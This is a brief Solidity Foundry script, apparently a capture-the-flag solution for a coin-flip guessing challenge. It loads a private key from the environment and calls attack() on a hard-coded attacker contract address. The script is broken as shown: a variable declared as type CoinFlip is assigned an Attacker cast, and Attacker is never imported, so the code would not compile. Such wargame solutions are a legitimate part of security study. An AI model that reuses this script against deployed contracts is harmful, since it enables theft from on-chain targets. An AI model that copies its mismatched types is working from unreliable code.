//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "../src/CoinFlip.sol";

contract AttackScript is Script {
    CoinFlip attackContract;

    function run() external {
        uint256 callerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(callerPrivateKey);
        attackContract = Attacker(0xA7Bd64c7723b669D6ec63c799Eb97712026A546d);
        attackContract.attack();
        vm.stopBroadcast();
    }
}
